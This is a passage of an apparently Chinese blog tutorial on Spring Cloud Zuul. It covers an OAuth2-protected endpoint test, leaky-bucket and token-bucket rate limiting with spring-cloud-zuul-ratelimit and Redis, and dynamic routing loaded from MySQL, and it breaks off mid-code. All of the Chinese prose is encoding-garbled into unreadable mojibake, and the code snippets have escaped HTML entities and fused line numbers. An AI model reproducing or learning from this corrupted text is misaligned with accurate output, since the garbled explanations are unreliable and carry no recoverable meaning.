http://127.0.0.1:8092/provider/service/testï¼Œç”±äºæœªæˆæƒï¼Œè¯¥æ¥å£ä¼šè¿”å›éœ€è¦æˆæƒæ‰èƒ½è®¿é—®çš„æç¤ºä¿¡æ¯ï¼ŒæŸ¥çœ‹æˆªå›¾ è®¿é—® http://127.0.0.1:8092ï¼Œä¼šè‡ªåŠ¨è·³è½¬åˆ° auth-server çš„é»˜è®¤ç™»å½•é¡µé¢ï¼ˆhttp://127.0.0.1:8091/uaa/loginï¼‰ï¼Œè¾“å…¥ç”¨æˆ·å admin ä¸ å¯†ç  admin è¿›è¡Œç™»å½•ï¼ŒæŸ¥çœ‹æˆªå›¾ å†æ¬¡è®¿é—® http://127.0.0.1:8092/provider/service/testï¼Œè°ƒç”¨æ¥å£æˆåŠŸï¼Œæ§åˆ¶å°çš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼š 1234567891011121314151617181920----------------header----------------upgrade-insecure-requests: 1user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9sec-fetch-site: nonesec-fetch-mode: navigatesec-fetch-user: ?1sec-fetch-dest: documentaccept-language: en,zh-CN;q=0.9,zh;q=0.8authorization: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODg2OTE4NzAsInVzZXJfbmFtZSI6ImFkbWluIiwiYXV0aG9yaXRpZXMiOlsiV1JJ ...x-forwarded-host: 127.0.0.1:8092x-forwarded-proto: httpx-forwarded-prefix: /provider/servicex-forwarded-port: 8092x-forwarded-for: 127.0.0.1accept-encoding: gzipcontent-length: 0host: 192.168.1.130:9090connection: Keep-Alive----------------header---------------- Zuul é™æµæ„å»ºä¸€ä¸ªè‡ªæˆ‘ä¿®å¤å‹ç³»ç»Ÿä¸€ç›´æ˜¯å„å¤§ä¼ä¸šè¿›è¡Œæ¶æ„è®¾è®¡çš„éš¾ç‚¹æ‰€åœ¨ï¼Œåœ¨ Hystrix ä¸­å¯ä»¥é€šè¿‡ç†”æ–­å™¨æ¥å®ç°ï¼Œé€šè¿‡æŸä¸ªé˜ˆå€¼æ¥å¯¹å¼‚å¸¸æµé‡è¿›è¡Œé™çº§å¤„ç†ã€‚å…¶å®ï¼Œé™¤å¯¹å¼‚å¸¸æµé‡è¿›è¡Œé™çº§å¤„ç†ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥åšä¸€äº›å…¶ä»–æ“ä½œæ¥ä¿æŠ¤ç³»ç»Ÿå…å— â€œé›ªå´©ä¹‹ç¾â€ï¼Œæ¯”å¦‚ï¼šæµé‡ æ’é˜Ÿã€é™æµã€åˆ†æµç­‰ã€‚ é™æµç®—æ³•è¯´åˆ°é™æµç®—æ³•ï¼Œä¸è‡ªè§‰å°±æƒ³åˆ°äº† â€œæ¼æ¡¶â€ ä¸ â€œä»¤ç‰Œæ¡¶â€ ç®—æ³•ã€‚è¯šç„¶ï¼Œä¸¤ç§é™æµçš„ç¥–å¸ˆçº§ç®—æ³•ç¡®æœ‰å…¶ç‹¬åˆ°ä¹‹å¤„ï¼Œå…¶ä»–å®ç°æ¯”å¦‚æ»‘åŠ¨æ—¶é—´çª—æˆ–è€…ä¸‰è‰²é€Ÿç‡æ ‡è®°æ³•ç­‰ï¼Œå…¶å®è´¨è¿˜æ˜¯ â€œæ¼æ¡¶â€ ä¸ â€œä»¤ç‰Œæ¡¶â€ çš„å˜ç§ï¼Œè¦ä¹ˆæ˜¯å°† â€œæ¼æ¡¶â€ å®¹ç§¯æ¢æˆäº†å•ä½æ—¶é—´ï¼Œè¦ä¹ˆæ˜¯æŒ‰è§„åˆ™å°†è¯·æ±‚æ ‡è®°é¢œè‰²è¿›è¡Œå¤„ç†ï¼Œåº•å±‚è¿˜æ˜¯ â€œä»¤ç‰Œâ€ çš„æ€æƒ³ã€‚æ‰€ä»¥ï¼ŒæŒæ¡ â€œæ¼æ¡¶â€ ä¸ â€œä»¤ç‰Œæ¡¶â€ ç®—æ³•åŸç†ï¼Œå¯¹ç†è§£å…¶ä»–é™æµç®—æ³•æœ‰ä¸€å®šå¸®åŠ©ã€‚ æ¼æ¡¶ï¼ˆLeaky Bucketï¼‰ç®—æ³•æ¼æ¡¶çš„åŸå‹æ˜¯ä¸€ä¸ªåº•éƒ¨æœ‰æ¼å­”çš„æ¡¶ï¼Œæ¡¶ä¸Šæ–¹æœ‰ä¸€ä¸ªå…¥æ°´å£ï¼Œæ°´ä¸æ–­åœ°æµè¿›æ¡¶å†…ï¼Œæ¡¶ä¸‹æ–¹çš„æ¼å­”å°±ä¼šä»¥ä¸€ä¸ªç›¸å¯¹æ’å®šçš„é€Ÿç‡æ¼æ°´ï¼Œåœ¨å…¥å¤§äºå²€çš„æƒ…å†µä¸‹ï¼Œæ¡¶åœ¨ä¸€æ®µæ—¶é—´ä¹‹åå°±ä¼šè¢«è£…æ»¡ï¼Œè¿™æ—¶å€™å¤šä½™çš„æ°´å°±ä¼šæº¢å‡ºï¼›è€Œåœ¨å…¥å°äºå‡ºçš„æƒ…å†µä¸‹ï¼Œæ¼æ¡¶åˆ™ä¸èµ·ä»»ä½•ä½œç”¨ã€‚åæ¥å°†è¿™ä¸ªç»å…¸æ¨¡å‹è¿ç”¨åœ¨ç½‘ç»œæµé‡æ•´å½¢ä¸Šé¢ï¼Œé€šè¿‡æ¼æ¡¶ç®—æ³•çš„çº¦æŸï¼Œçªå‘æµé‡å¯ä»¥è¢«æ•´å½¢ä¸ºä¸€ä¸ªè§„æ•´çš„æµé‡ï¼ˆå¦‚å›¾æ‰€ç¤ºï¼‰ã€‚å½“è¯·æ±‚æˆ–è€…å…·æœ‰ä¸€å®šä½“é‡çš„æ•°æ®æµæ¶Œæ¥çš„æ—¶å€™ï¼Œåœ¨æ¼æ¡¶çš„ä½œç”¨ä¸‹ï¼Œæµé‡è¢«æ•´å½¢ï¼Œä¸èƒ½æ»¡è¶³è¦æ±‚çš„éƒ¨åˆ†è¢«å‰Šå‡æ‰ã€‚æ‰€ä»¥ï¼Œæ¼æ¡¶ç®—æ³•èƒ½å¤Ÿå¼ºåˆ¶é™å®šæµé‡é€Ÿç‡ã€‚æ³¨æ„ï¼Œåœ¨ä¼ä¸šåº”ç”¨ä¸­ï¼Œè¿™éƒ¨åˆ†æº¢å‡ºçš„æµé‡æ˜¯å¯ä»¥è¢«åˆ©ç”¨èµ·æ¥çš„ï¼Œå¹¶éå®Œå…¨ä¸¢å¼ƒï¼Œå¯ä»¥æŠŠå®ƒä»¬æ”¶é›†åˆ°ä¸€ä¸ªé˜Ÿåˆ—é‡Œé¢ï¼Œåšæµé‡æ’é˜Ÿï¼Œå°½é‡åšåˆ°åˆç†åˆ©ç”¨æ‰€æœ‰èµ„æºã€‚ ä»¤ç‰Œæ¡¶ï¼ˆToken Bucketï¼‰ç®—æ³•ä»¤ç‰Œæ¡¶ç®—æ³•å’Œæ¼æ¡¶ç®—æ³•æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ¡¶é‡Œé¢å­˜æ”¾ä»¤ç‰Œï¼Œè€Œä»¤ç‰Œåˆæ˜¯ä»¥ä¸€ä¸ªæ’å®šçš„é€Ÿç‡è¢«åŠ å…¥æ¡¶å†…ï¼Œå¯ä»¥ç§¯å‹ï¼Œå¯ä»¥æº¢å‡ºã€‚å½“æ•°æ®æµæ¶Œæ¥æ—¶ï¼Œé‡åŒ–è¯·æ±‚ç”¨äºè·å–ä»¤ç‰Œï¼Œå¦‚æœå–åˆ°ä»¤ç‰Œåˆ™æ”¾è¡Œï¼ŒåŒæ—¶æ¡¶å†…ä¸¢å¼ƒæ‰è¿™ä¸ªä»¤ç‰Œï¼›å¦‚æœä¸èƒ½å–åˆ°ä»¤ç‰Œï¼Œè¯·æ±‚åˆ™è¢«ä¸¢å¼ƒï¼ˆå¦‚å›¾æ‰€ç¤ºï¼‰ã€‚ç”±äºä»¤ç‰Œæ¡¶å†…å¯ä»¥å­˜åœ¨ä¸€å®šæ•°é‡çš„ä»¤ç‰Œï¼Œé‚£ä¹ˆå°±å¯èƒ½å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æµé‡çªå‘ï¼Œè¿™ä¹Ÿæ˜¯å†³å®šæ¼æ¡¶ç®—æ³•ä¸ä»¤ç‰Œæ¡¶ç®—æ³•é€‚ç”¨äºä¸åŒåº”ç”¨åœºæ™¯çš„ä¸»è¦åŸå› ã€‚ é™æµå®æˆ˜åœ¨ Zuul ä¸­å®ç°é™æµæœ€ç®€å•çš„æ–¹å¼æ˜¯ä½¿ç”¨è‡ªå®šä¹‰ Filter åŠ ä¸Šç›¸å…³é™æµç®—æ³•ï¼Œå…¶ä¸­å¯èƒ½ä¼šè€ƒè™‘åˆ° Zuul çš„å¤šèŠ‚ç‚¹éƒ¨ç½²ï¼Œå› ä¸ºç®—æ³•çš„åŸå› ï¼Œè¿™æ—¶å€™éœ€è¦ä¸€ä¸ª K/V å­˜å‚¨å·¥å…·ï¼ˆæ¨èä½¿ç”¨ Redisï¼Œå……åˆ†åˆ©ç”¨ Redis å•çº¿ç¨‹çš„ç‰¹æ€§ï¼Œå¯ä»¥æœ‰æ•ˆé¿å…å¤šèŠ‚ç‚¹å¸¦æ¥çš„ä¸€äº›é—®é¢˜)ã€‚å½“ç„¶å¦‚æœ Zuul æ˜¯å•èŠ‚ç‚¹åº”ç”¨ï¼Œé™æµæ–¹å¼çš„é€‰æ‹©å°±ä¼šå¹¿å¾—å¤šï¼Œå®Œå…¨å¯ä»¥å°†ç›¸å…³ prefix æ”¾åœ¨å†…å­˜ä¹‹ä¸­ï¼Œæ–¹ä¾¿åˆå¿«æ·ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸ªå¼€ç®±å³ç”¨çš„å·¥å…· spring-cloud-zuul-ratelimitï¼Œå®ƒæ˜¯ä¸“é—¨é’ˆå¯¹ Zuul ç¼–å†™çš„é™æµåº“ï¼Œæä¾›äº†ä»¥ä¸‹ç‰¹æ€§ï¼š å¤šç§ç»†ç²’åº¦ç­–ç•¥ï¼š å¤šç§ç²’åº¦ä¸´æ—¶å˜é‡å­˜å‚¨æ–¹å¼ï¼š çˆ¶ Maven å·¥ç¨‹çš„ pom.xml æ–‡ä»¶ï¼Œè¿™é‡Œ Spring Cloud çš„ç‰ˆæœ¬æ˜¯ Hoxton.SR4ï¼ŒSpring Boot çš„ç‰ˆæœ¬æ˜¯ 2.2.6.RELEASEï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738&lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.2.6.RELEASE&lt;/version&gt;&lt;/parent&gt;&lt;!-- åˆ©ç”¨ä¼ é€’ä¾èµ–ï¼Œå…¬å…±éƒ¨åˆ† --&gt;&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt;&lt;/dependencies&gt;&lt;!-- ç®¡ç†ä¾èµ– --&gt;&lt;dependencyManagement&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt; &lt;version&gt;Hoxton.SR4&lt;/version&gt; &lt;type&gt;pom&lt;/type&gt; &lt;scope&gt;import&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt;&lt;/dependencyManagement&gt;&lt;!--æ³¨æ„ï¼šè¿™é‡Œéœ€è¦æ·»åŠ ä»¥ä¸‹é…ç½®ï¼Œå¦åˆ™å¯èƒ½ä¼šæœ‰å„ç§ä¾èµ–é—®é¢˜ --&gt;&lt;repositories&gt; &lt;repository&gt; &lt;id&gt;spring-milestones&lt;/id&gt; &lt;name&gt;Spring Milestones&lt;/name&gt; &lt;url&gt;https://repo.spring.io/libs-milestone&lt;/url&gt; &lt;snapshots&gt; &lt;enabled&gt;false&lt;/enabled&gt; &lt;/snapshots&gt; &lt;/repository&gt;&lt;/repositories&gt; zuul-server é‡Œçš„ pom.xml æ–‡ä»¶ï¼š 1234567891011121314151617&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.marcosbarbero.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-zuul-ratelimit&lt;/artifactId&gt; &lt;version&gt;2.4.0.RELEASE&lt;/version&gt;&lt;/dependency&gt; zuul-server é‡Œçš„ application.yml æ–‡ä»¶ï¼š 1234567891011121314151617181920212223242526272829303132333435server: port: 8092spring: application: name: zuul-server redis: host: 172.175.0.3 port: 6379 password:eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: truezuul: routes: provider-service: path: /provider/service/** serviceId: provider-service ratelimit: enabled: true key-prefix: ratelimit repository: REDIS behind-proxy: true #è¡¨ç¤ºä»£ç†ä¹‹å policy-list: provider-service: #å•ç‹¬ç»†åŒ–åˆ°æœåŠ¡ç²’åº¦ - limit: 2 #åœ¨ä¸€ä¸ªå•ä½æ—¶é—´çª—å£ï¼ˆç§’ï¼‰çš„è¯·æ±‚æ•°é‡ quota: 1 #åœ¨ä¸€ä¸ªå•ä½æ—¶é—´çª—å£ï¼ˆç§’ï¼‰çš„è¯·æ±‚æ—¶é—´é™åˆ¶ refresh-interval: 3 #åˆ·æ–°æ—¶é—´ï¼ˆç§’ï¼‰ type: - url #æŒ‡å®šurlç²’åº¦ zuul-server é‡Œçš„å¯åŠ¨ä¸»ç±»ï¼š 123456789@EnableZuulProxy@EnableDiscoveryClient@SpringBootApplicationpublic class ZuulServerApplication { public static void main(String[] args) { SpringApplication.run(ZuulServerApplication.class, args); }} æµ‹è¯•æ•ˆæœï¼š ä¾æ¬¡å¯åŠ¨ eureka-serverã€provider-serviceã€zuul-server åº”ç”¨ å¤šæ¬¡è®¿é—® http://127.0.0.1:8092/provider/service/provider/add?b=3ï¼Œåœ¨æ—¶é—´çª—é˜ˆå€¼å†…è®¿é—®æ¥å£æ—¶ï¼Œæ¥å£ä¼šè¿”å›æ­£ç¡®ä¿¡æ¯ï¼›ä¸€æ—¦è¶…é™ï¼Œåå°ä¼šæŠ›å‡º 429 å¼‚å¸¸ï¼Œæ¥å£è¿”å›å¯¹åº”çš„é”™è¯¯ä¿¡æ¯ï¼ŒæŸ¥çœ‹æˆªå›¾ Zuul åŠ¨æ€è·¯ç”±åŠ¨æ€è·¯ç”±æ¦‚è¿°Zuul æä¾›äº†å„ç§æ˜ å°„è§„åˆ™çš„é…ç½®æ–¹å¼ï¼Œè¿™æå¤§åœ°å¢åŠ äº†åœ¨æ„å»ºåº”ç”¨æ—¶çš„é€‰æ‹©ä½™åœ°ï¼Œè¿™äº›æ–¹å¼ç§°ä¸º â€œé™æ€è·¯ç”±ï¼ˆStatic Routingï¼‰â€ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨å¾®æœåŠ¡æ„å»ºå‰æœŸå°±å·²ç»æŒ‰ç…§ä¸šåŠ¡æŠŠå„ç§æ˜ å°„å…³ç³»åˆ¶å®šå¥½äº†ï¼Œä½†æ˜¯åœ¨åæœŸè¿­ä»£è¿‡ç¨‹ä¸­ï¼Œä¸€ä¸ªå¤æ‚çš„ç³»ç»Ÿéš¾å…ç»å†æ–°æœåŠ¡çš„ä¸Šçº¿è¿‡ç¨‹ï¼Œè¿™ä¸ªæ—¶å€™ä¸èƒ½è½»æ˜“åœæ‰çº¿ä¸ŠæŸäº›æ˜ å°„é“¾è·¯ï¼›é‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼ŒZuul æ˜¯åœ¨å¯åŠ¨çš„æ—¶å€™å°†é…ç½®æ–‡ä»¶ä¸­çš„æ˜ å°„è§„åˆ™å†™å…¥å†…å­˜ï¼Œè¦æ–°å»ºæ˜ å°„è§„åˆ™ï¼Œåªèƒ½ä¿®æ”¹äº†é…ç½®æ–‡ä»¶ä¹‹åå†é‡æ–°å¯åŠ¨ Zuul åº”ç”¨ã€‚é‚£èƒ½ä¸èƒ½æœ‰ä¸€ç§æ–¹æ³•ï¼Œæ—¢èƒ½æŒ‰éœ€ä¿®æ”¹æ˜ å°„è§„åˆ™ï¼Œåˆèƒ½ä½¿æœåŠ¡å…äºé‡å¯ä¹‹ç—›å‘¢ï¼Ÿç­”æ¡ˆæ˜¯æœ‰çš„ï¼Œç›®å‰æœ‰å¦‚ä¸‹ä¸¤ç§è§£å†³æ–¹æ¡ˆå®ç° â€œåŠ¨æ€è·¯ç”±ï¼ˆDynamic Routingï¼‰â€ï¼Œé€šå¸¸é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼ï¼Œè¿™æ˜¯ Spring Cloud ç”Ÿæ€æ¨å´‡çš„æ–¹å¼ï¼Œä½†æ˜¯ä¹Ÿæœ‰å®ƒçš„å±€é™æ€§ï¼Œæœ‰å…´è¶£çš„è¯»è€…å¯ä»¥æŸ¥é˜…ç›¸å…³èµ„æ–™ã€‚ ç»“åˆ Spring Cloud Config + Busï¼ŒåŠ¨æ€åˆ·æ–°é…ç½®æ–‡ä»¶ï¼Œè¿™ç§æ–¹å¼çš„å¥½å¤„æ˜¯ä¸ç”¨ Zuul ç»´æŠ¤æ˜ å°„è§„åˆ™ï¼Œå¯ä»¥éšæ—¶ä¿®æ”¹ï¼Œéšæ—¶ç”Ÿæ•ˆï¼›å”¯ä¸€ä¸å¥½çš„åœ°æ–¹æ˜¯éœ€è¦å•ç‹¬é›†æˆä¸€äº›ä½¿ç”¨å¹¶ä¸é¢‘ç¹çš„ç»„ä»¶ï¼ŒConfig æ²¡æœ‰å¯è§†åŒ–ç•Œé¢ï¼Œç»´æŠ¤èµ·è§„åˆ™æ¥ä¹Ÿç›¸å¯¹éº»çƒ¦ é‡å†™ Zuul çš„é…ç½®è¯»å–æ–¹å¼ï¼Œé‡†ç”¨äº‹ä»¶åˆ·æ–°æœºåˆ¶ï¼Œä»æ•°æ®åº“è¯»å–è·¯ç”±æ˜ å°„è§„åˆ™ï¼Œæ­¤ç§æ–¹å¼å› ä¸ºåŸºäºæ•°æ®åº“ï¼Œå¯è½»æ¾å®ç°ç®¡ç†ç•Œé¢ï¼Œçµæ´»åº¦è¾ƒé«˜ åŠ¨æ€è·¯ç”±å®ç°åŸç†å‰–æZuul åŠ¨æ€è·¯ç”±å®ç°çš„å››ä¸ªæ ¸å¿ƒç±»ï¼š DiscoveryClientRouteLocator ç±»ä¸­çš„ locateRoutes() æ–¹æ³•ç»§æ‰¿è‡ª SimpleRouteLocator ç±»å¹¶é‡å†™äº†è§„åˆ™ï¼Œè¯¥æ–¹æ³•ä¸»è¦çš„åŠŸèƒ½å°±æ˜¯å°†é…ç½®æ–‡ä»¶ä¸­çš„æ˜ å°„è§„åˆ™ä¿¡æ¯åŒ…è£…æˆ LinkedHashMap&lt;String, ZuulRoute&gt;ï¼Œé”®æ˜¯æ˜ å°„è·¯å¾„ï¼Œå€¼æ˜¯é…ç½®æ–‡ä»¶çš„å°è£…ç±»ï¼Œä»¥å¾€æ‰€è§çš„é…ç½®æ˜ å°„è¯»å–è¿›æ¥å°±æ˜¯ä½¿ç”¨ ZuulRoute æ¥å°è£…ã€‚refiresh() å®ç°è‡ª RefreshableRouteLocator æ¥å£ï¼Œæ·»åŠ åˆ·æ–°åŠŸèƒ½å¿…é¡»è¦å®ç°æ­¤æ–¹æ³•ï¼ŒdoRefresh() æ–¹æ³•æ¥è‡ª SimpleRouteLocator ç±»ã€‚ SimpleRouteLocator è¯¥ç±»æ˜¯ DiscoveryClientRouteLocator çš„çˆ¶ç±»ï¼Œæ­¤ç±»åŸºæœ¬å®ç°äº† RouteLocator æ¥å£ï¼Œå¯¹è¯»å–çš„é…ç½®æ–‡ä»¶ä¿¡æ¯åšä¸€äº›åŸºæœ¬å¤„ç†ï¼Œæä¾›äº†æ–¹æ³• doRefresh() ä¸ locateRoutes() ä¾›å­ç±»å®ç°åˆ·æ–°ç­–ç•¥ä¸æ˜ å°„è§„åˆ™åŠ è½½ç­–ç•¥ï¼Œä¸¤ä¸ªæ–¹æ³•éƒ½æ˜¯ä½¿ç”¨ protected ä¿®é¥°ï¼Œæ˜¯ä¸ºäº†è®©å­ç±»ä¸ç”¨ç»´æŠ¤æ­¤ç±»ä¸€äº›æˆå‘˜å˜é‡å°±èƒ½å¤Ÿå®ç°åˆ·æ–°æˆ–è€…è¯»å–è·¯ç”±çš„åŠŸèƒ½ã€‚ ZuulServerAutoConfiguration åœ¨ä½ç‰ˆæœ¬çš„ Spring Cloud Zuul ä¸­ï¼Œè¿™ä¸ªç±»å«ä½œ ZuulConfigurationï¼Œä½äº org.springframework. cloud.netflix.zuul åŒ…ä¸­ï¼Œä¸»è¦ç›®çš„æ˜¯æ³¨å†Œå„ç§è¿‡æ»¤å™¨ã€ç›‘å¬å™¨ä»¥åŠå…¶ä»–åŠŸèƒ½ã€‚Zuul åœ¨æ³¨å†Œä¸­å¿ƒæ–°å¢æœåŠ¡ååˆ·æ–°ç›‘å¬å™¨ä¹Ÿæ˜¯åœ¨æ­¤æ³¨å†Œçš„ï¼Œåº•å±‚æ˜¯é‡‡ç”¨ Spring çš„ ApplicationListener æ¥å®ç°ã€‚ç”±æ–¹æ³• onApplicationEvent(ApplicationEvent event) å¯çŸ¥ï¼ŒZuul ä¼šæ¥æ”¶ 3 ç§äº‹ä»¶é€šçŸ¥ï¼ˆContextRefreshedEventã€RefreshScopeRefreshedEventã€RoutesRefreshedEventï¼‰å»åˆ·æ–°è·¯ç”±æ˜ å°„é…ç½®ä¿¡æ¯ï¼Œæ­¤å¤–å¿ƒè·³ç»­çº¦ç›‘è§†å™¨ HeartbeatMonitor ä¹Ÿä¼šè§¦å‘è¿™ä¸ªåŠ¨ä½œã€‚ ZuulHandlerMapping æ­¤ç±»æ˜¯å°†æœ¬åœ°é…ç½®çš„æ˜ å°„å…³ç³»æ˜ å°„åˆ°è¿œç¨‹çš„è¿‡ç¨‹æ§åˆ¶å™¨ï¼Œä¸äº‹ä»¶åˆ·æ–°ç›¸å…³çš„ä»£ç ã€‚ç±»é‡Œçš„ dirty å±æ€§å¾ˆé‡è¦ï¼Œå®ƒæ˜¯ç”¨æ¥æ§åˆ¶å½“å‰æ˜¯å¦éœ€è¦é‡æ–°åŠ è½½æ˜ å°„é…ç½®ä¿¡æ¯çš„æ ‡è®°ï¼Œåœ¨ Zuul æ¯æ¬¡è¿›è¡Œè·¯ç”±æ“ä½œçš„æ—¶å€™éƒ½ä¼šæ£€æŸ»è¿™ä¸ªå€¼ï¼Œå¦‚æœä¸º trueï¼Œå°±ä¼šè§¦å‘é…ç½®ä¿¡æ¯çš„é‡æ–°åŠ è½½ï¼ŒåŒæ—¶å†å°†å…¶å›è®¾ä¸º falseã€‚ç”± setDirty(boolean dirty) å¯çŸ¥ï¼Œå¯åŠ¨åˆ·æ–°åŠ¨ä½œå¿…é¡»è¦å®ç° RefreshableRouteLocator æ¥å£ã€‚ åŸç†æ€»ç»“ åœ¨æ„å»ºåŠ¨æ€è·¯ç”±çš„æ—¶å€™ï¼Œåªéœ€è¦é‡å†™ SimpleRouteLocator ç±»çš„ locateRoutes() æ–¹æ³•ï¼Œå¹¶ä¸”å®ç° RefreshableRouteLocator æ¥å£çš„ refresh() æ–¹æ³•ï¼Œå†åœ¨å†…éƒ¨è°ƒç”¨ SimpleRouteLocator ç±»çš„ doRefresh() æ–¹æ³•ï¼Œå°±å¯ä»¥æ„å»ºèµ·ä¸€ä¸ªç”± Zuul å†…éƒ¨äº‹ä»¶è§¦å‘çš„è‡ªå®šä¹‰åŠ¨æ€è·¯ç”±åŠ è½½å™¨ã€‚å¦‚æœä¸æƒ³ä½¿ç”¨å†…éƒ¨äº‹ä»¶è§¦å‘é…ç½®æ›´æ–°æ“ä½œï¼Œæ”¹ä¸ºæ‰‹åŠ¨è§¦å‘ï¼Œå¯ä»¥é‡å†™ onApplicationEvent(ApplicationEvent event) æ–¹æ³•ï¼Œäº‹å®ä¸Šæ‰‹åŠ¨è§¦å‘çš„æ§åˆ¶æ€§æ›´å¥½ã€‚ åŸºäº DB çš„åŠ¨æ€è·¯ç”±å®æˆ˜ä¸‹é¢åšä¸€ä¸ªå®æˆ˜ä¾‹å­ï¼Œè¿™é‡Œçš„ DB æš‚ä¸”é€‰ç”¨ MySQLï¼Œå½“ç„¶ä¹Ÿå¯ä»¥é€‰æ‹©å…¶ä»–æŒä¹…åŒ–æ–¹å¼ï¼Œç›®çš„æ˜¯æ–¹ä¾¿ï¼Œæ˜“äºç®¡ç†ï¼Œå®é™…ä¸Šé€‰ç”¨ MongoDB ä¹Ÿæ˜¯ä¸€ç§ä¸é”™çš„é€‰æ‹©ï¼Œç‚¹å‡»ä¸‹è½½å®Œæ•´çš„ç¤ºä¾‹ä»£ç ã€‚ å­˜å‚¨æ˜ å°„è§„åˆ™çš„æ•°æ®åº“è¡¨è®¾è®¡ï¼š zuul-server çš„ pom.xml æ–‡ä»¶ï¼š 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-netflix-zuul&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-jdbc&lt;/artifactId&gt;&lt;/dependency&gt; zuul-server çš„ application.yml æ–‡ä»¶ï¼Œå¦‚æœéœ€è¦é˜²æ­¢æœåŠ¡ä¾µå…¥ï¼Œè¿™é‡Œå¯ä»¥å°† ribbon.eureka.enabled è®¾ç½®ä¸º falseï¼š 12345678910111213141516171819202122server: port: 8092spring: application: name: zuul-server datasource: url: jdbc:mysql://localhost:3306/zuul-test?useUnicode=true&amp;characterEncoding=utf-8 driver-class-name: com.mysql.jdbc.Driver username: root password: 123456eureka: client: service-url: defaultZone: http://127.0.0.1:8090/eureka instance: prefer-ip-address: trueribbon: eureka: enabled: true åœ¨ zuul-server é‡Œç¼–å†™ DAO ç±»ï¼Œä»æ•°æ®åº“è¯»å–è·¯ç”±é…ç½®ä¿¡æ¯ï¼š 12345678910111213141516171819202122@Componentpublic class PropertiesDao { @Autowired private JdbcTemplate jdbcTemplate; private final static String SQL = "SELECT * FROM zuul_route WHERE enabled = TRUE"; public Map&lt;String, ZuulProperties.ZuulRoute&gt; getProperties() { Map&lt;String, ZuulProperties.ZuulRoute&gt; routes = new LinkedHashMap&lt;&gt;(); List&lt;ZuulRouteEntity&gt; list = jdbcTemplate.query(SQL, new BeanPropertyRowMapper&lt;&gt;(ZuulRouteEntity.class)); list.forEach(entity -&gt; { if (StringUtils.isEmpty(entity.getPath())) { return; } ZuulProperties.ZuulRoute zuulRoute = new ZuulProperties.ZuulRoute(); BeanUtils.copyProperties(entity, zuulRoute); routes.put(zuulRoute.getPath(), zuulRoute); }); return routes; }} åœ¨ zuul-server é‡Œç¼–å†™è‡ªå®šä¹‰è·¯ç”±é…ç½®åŠ è½½å™¨ç±»ï¼Œè¯¥ç±»æ˜¯æ”¹é€ çš„æ ¸å¿ƒç±»ï¼ŒlocateRoutes() æ–¹æ³•ä»æ•°æ®åº“åŠ è½½é…ç½®ä¿¡æ¯ï¼Œå¹¶ä¸”é…åˆ Zuul å†…éƒ¨äº‹ä»¶åˆ·æ–°æœºåˆ¶ï¼Œå®é™…ä¸Šæ¯æ¬¡å¿ƒè·³ç»­çº¦éƒ½ä¼šè§¦å‘è·¯ç”±é…ç½®é‡æ–°åŠ è½½çš„æ“ä½œï¼Œå¦‚æœéœ€è¦æ”¹ä¸ºæ‰‹åŠ¨è§¦å‘ï¼Œå¯å‚è€ƒä¸Šé¢çš„åŠ¨æ€è·¯ç”±å®ç°åŸç†å‰–æï¼š 12345678910111213141516171819202122232425262728293031323334353637383940public class DynamicZuulRouteLocator extends SimpleRouteLocator implements RefreshableRouteLocator { @Autowired private ZuulProperties properties; @Autowired private PropertiesDao propertiesDao; public DynamicZuulRouteLocator(String servletPath, ZuulProperties properties) { super(servletPath, properties); this.properties = properties; } @Override public void refresh() { doRefresh(); } @Override protected Map&lt;String, ZuulRoute&gt; locateRoutes() { LinkedHashMap&lt;String, ZuulRoute&gt; routesMap = new LinkedHashMap&lt;&gt;(); routesMap.putAll(super.locateRoutes()); routesMap.putAll(propertiesDao.getProperties()); LinkedHashMap&lt;String, ZuulRoute&gt; values = 